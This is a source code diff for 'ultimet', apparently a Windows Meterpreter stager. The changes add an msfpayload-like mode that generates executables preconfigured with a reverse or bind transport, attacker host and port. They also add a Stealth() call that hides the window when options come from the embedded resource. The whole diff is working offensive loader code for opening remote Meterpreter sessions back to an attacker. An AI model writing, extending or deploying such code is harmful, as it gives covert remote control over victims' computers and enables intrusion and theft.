@@ -58,12 +58,18 @@ int wmain(int argc, wchar_t *argv[])
 	bool FallbackToStager = false;				// If the stage is not bundled in the exe as a resource, or "-f" is not specified, ultimet falls back to work as a stager: if this is true, metsvc will not be availabe. 
 	bool metsvc = false;						// Is metsvc chosen as the transport? this will only work if we have the stage upfront, otherwise it will fail.
 	bool bBind = false;							// Are we bind payload?.
+	bool MSFPAYLOAD = false;					// Create a msfpayload-like exe instead of executing? 
 	int err = 0;								// Errors
+	wchar_t UNICODEtransport_2[64] = {0};		// Sorry, I'm out of variable names ...
 
 	//If we will get options from resource
 	wchar_t UNICODEtransport[64] = {0};
 	wchar_t UNICODElhost[128] = {0};
 	wchar_t UNICODElport[32] = {0};
+
+	char ANSItransport[64] = {0};
+	char ANSIlhost[128] = {0};
+	char ANSIlport[32] = {0};
 
 	//If "-f" is specified (load stage from local file)
 	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, path will be put here. 
@@ -77,26 +83,6 @@ int wmain(int argc, wchar_t *argv[])
 	Program Start
 	**************/
 
-	if(argv[1] != NULL)
-	{
-		if(wcscmp(argv[1],L"--reset") == 0)
-		{
-			dprintf(L"[*] Creating a `clean` ultimet copy with all options reset to default ... \n");
-			CopyFile(argv[0],L"ultimet_reset.exe",FALSE);
-			ResourceOptionsReset();
-			exit(1);
-		}
-
-		// Is `--remove-stage` been given as the first argument?
-		// if yes, we'll copy ourselfs to a file called `ultimet_lite.exe`, then update the remove resource that contains the stage.
-		if(wcscmp(argv[1],L"--remove-stage") == 0)
-		{
-			dprintf(L"[*] Creating a new file with stage removed... \n");
-			CopyFile(argv[0],L"ultimet_no_stage.exe",FALSE);
-			RemoveStage();
-			exit(1);
-		}
-	}
 	//This will be used later for deciding if we can get options from resource...
 	BOOL validTransport = false;
 	if(GetOptionsFromResource(UNICODEtransport,UNICODElhost,UNICODElport)) //
@@ -133,7 +119,8 @@ int wmain(int argc, wchar_t *argv[])
 			if (i != argc) // Check that we haven't finished parsing already
 				if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are reverse_tcp, reverse_metsvc, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
 					payload_settings.TRANSPORT = argv[i + 1];
-					_wcsupr_s(payload_settings.TRANSPORT, wcslen(payload_settings.TRANSPORT) * sizeof(wchar_t)); // Wide-String-to-uppercase
+					_wcsupr(payload_settings.TRANSPORT);  // Wide-String-to-uppercase
+					wcscpy(UNICODEtransport_2,payload_settings.TRANSPORT); //we will use UNICODEtransport_2 if we've been asked to do msfpayload
 					if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
 					{
 						payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
@@ -168,6 +155,7 @@ int wmain(int argc, wchar_t *argv[])
 						dprintf(L"\n    reverse_https, bind_tcp and bind_metsvc.\n");  
 						exit(1);
 					}
+
 					// End of Transport checks
 				} else if (wcscmp(argv[i], L"-h") == 0) {		//LHOST
 					payload_settings.LHOST = argv[i + 1];
@@ -185,6 +173,8 @@ int wmain(int argc, wchar_t *argv[])
 					print_header();
 					usage();
 					exit(1);
+				}  else if (wcscmp(argv[i], L"--msfpayload") == 0) {		//are we going to mimic msfpayload?
+					MSFPAYLOAD = true;
 				}
 		}
 		//Do we have the minimum parameters?
@@ -193,19 +183,35 @@ int wmain(int argc, wchar_t *argv[])
 			dprintf(L"[-] Not enough parameters! \n\n");
 			usage();
 			exit(1);
-		}
-	}
+		} else validTransport = false; // This is a bit confusing, but works: if we have the minimum info to get started, we will set validTransport to false so we will not start parsing options from resource.
+		
+		//////////////////////// start of msfpayload //////////////////////////////
+		if(MSFPAYLOAD) // We will create a new exe with specified options, then exit
+		{
+			dprintf(L"[*] Switching to MSFPAYLOAD mode, parsing options ... \n");
+			dprintf(L"\tTRANSPORT\t:\t%s\n",UNICODEtransport_2);
+			dprintf(L"\tLHOST\t\t:\t%s\n",payload_settings.LHOST);
+			dprintf(L"\tLPORT\t\t:\t%s\n",payload_settings.LPORT);
 
-	///////////////////////////////// Parsing from resource ///////////////////////////////////
+			UnicodeToAnsi(ANSItransport, UNICODEtransport_2);
+			UnicodeToAnsi(ANSIlhost, payload_settings.LHOST);
+			UnicodeToAnsi(ANSIlport, payload_settings.LPORT);
+
+			msfpayload(ANSItransport, ANSIlhost, ANSIlport);
+			//msfpayload will exit ...
+		}
+
+		///////////////////////////////// Parsing from resource ///////////////////////////////////
 	/*	Will try to parse options from resource, 
 		this can fail in two ways:
 			one: if we couldn't read from resource
 			two: we read options from resource correctly, however, the smarty-pants who put the configuration did not set a valid transport
 		So, we'll check for any of those two errors, if any of them failed, we'll proceed to other options to get the parameters from.
 	*/
-
+	}
 	else if(validTransport) //if true means that TRNSPORT, LHOST & LPORT are retrieved successfully from the resource AND the retrieved transport is a valid one.
 	{
+		Stealth(); // hide window :) 
 		payload_settings.TRANSPORT	=	UNICODEtransport;
 		payload_settings.LHOST		=	UNICODElhost;
 		payload_settings.LPORT		=	UNICODElport;
@@ -241,7 +247,13 @@ int wmain(int argc, wchar_t *argv[])
 			bBind = true;
 		}
 	}
-
+	// check...
+	if(payload_settings.TRANSPORT == NULL || payload_settings.LPORT == NULL || payload_settings.LHOST == NULL)
+	{
+		dprintf(L"[-] Not enough parameters! \n\n");
+		usage();
+		exit(1);
+	}
 
 	//Have we been asked to load the stage from a file?
 	if(wcscmp(StageFilePath, L"") != 0)
